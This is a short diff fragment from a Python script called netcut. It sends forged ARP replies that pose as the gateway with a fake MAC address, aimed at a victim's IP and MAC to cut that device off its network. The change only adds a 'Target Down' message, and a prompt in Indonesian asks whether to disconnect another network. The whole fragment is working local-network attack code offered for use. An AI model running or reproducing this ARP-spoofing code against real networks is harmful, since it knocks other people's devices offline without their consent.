@@ -11,6 +11,7 @@ def netcut(gateway):
         gateway_ip = gateway
         packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
         send(packet, verbose=0)
+        print("Target Down")
         ask = input("Ingin memutuskan jaringan lain ??? y/n ")
         if ask=="y":
             continue
